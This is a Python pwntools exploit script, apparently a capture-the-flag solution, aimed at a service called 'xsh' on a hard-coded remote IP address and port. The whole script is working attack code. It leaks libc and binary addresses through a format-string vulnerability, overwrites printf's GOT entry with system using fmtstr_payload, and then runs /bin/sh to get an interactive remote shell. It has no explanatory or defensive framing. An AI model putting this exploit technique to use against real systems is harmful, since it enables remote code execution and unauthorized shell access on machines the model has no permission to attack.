from pwn import *
import sys

#p = process('./xsh')
p = remote("35.192.206.226", 5555)
payload = ""
payload += "echo %18$p"

p.sendline(payload)
io_stdin = int(p.recvline().split("$")[1].replace(" ","")[:10:],16)
print "io_stdin : ",hex(io_stdin)
libc_base = io_stdin - 0x1adc20 #remote
print "libc_base : ",hex(libc_base)
system_libc = libc_base + 0x040310 #remote
print "system_libc :",hex(system_libc)
payload = ""
payload += "echo %1$p"
p.sendline(payload)
leaked = int(p.recvline().split("$")[1].replace(" ","")[:10:],16)


printf_got = leaked + 0x1c5e
print "printf_got : ",hex(printf_got)
pause()
payload = "echo BBB"
#payload +=  "%{}x%25$hn".format(str(x)) + "%{}x%26$hn".format(str(y)) + p32(printf_got) + p32(printf_got+2)
payload += fmtstr_payload(25,{printf_got:system_libc},3,'byte')
p.sendline(payload)
p.sendline("echo /bin/sh")
p.interactive()


